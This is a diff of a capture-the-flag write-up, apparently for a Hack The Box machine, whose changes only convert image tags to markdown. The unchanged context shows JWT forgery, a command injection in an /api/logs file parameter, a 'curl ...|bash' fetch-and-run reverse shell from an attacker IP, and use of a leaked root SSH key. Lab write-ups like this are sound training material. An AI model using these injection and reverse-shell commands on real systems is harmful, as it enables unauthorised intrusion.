@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 
 Port 80 was some kind of documentation website.
 
-<figure><img src="../../../.gitbook/assets/image (1297).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1297).png>)
 
 This box uses JWT Tokens and an API to create new users and login. The API is hosted on port 3000. We can actually download all the source code and view the files within:
 
@@ -112,7 +112,7 @@ Then, we can spoof the token using this website:
 
 {% embed url="https://jwt.io/" %}
 
-<figure><img src="../../../.gitbook/assets/image (4055).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4055).png>)
 
 We can verify that this works by using the `/api/priv` endpoint:
 
@@ -127,11 +127,11 @@ We can confirm RCE using this:
 $ curl 'http://10.129.71.62/api/logs?file=t;curl+10.10.14.13/rcecfm' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDU3NDUyNDA1MjNjMDA0N2VhOWM4NTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAd2Vic2l0ZS5jb20iLCJpYXQiOjE2ODM0NDA5ODZ9.88MSrMOiPfw7x7CzUNKPvNlUmVPMQ2S-ZtaQY-9PRuE'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (4031).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4031).png>)
 
 Then we can just use `curl 10.10.14.13/shell.sh|bash` to get a reverse shell.
 
-<figure><img src="../../../.gitbook/assets/image (2829).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2829).png>)
 
 Grab that user flag.
 
@@ -458,7 +458,7 @@ Date          ExecutableTimestamp  ProcCwd      ProcStatus   UserGroups
 
 When we use `strings` on the `CoreDump` file, we can find the root flag:
 
-<figure><img src="../../../.gitbook/assets/image (2033).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2033).png>)
 
 It seems that because we are running the `count` binary as `root` and we crash the program while reading the file, the file contents is still in memory. When the `CoreDump` file is created, the contents of memory is still present.
 
@@ -492,6 +492,6 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 
 With this private key, we can `ssh` in as `root`.
 
-<figure><img src="../../../.gitbook/assets/image (2940).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2940).png>)
 
 Rooted!
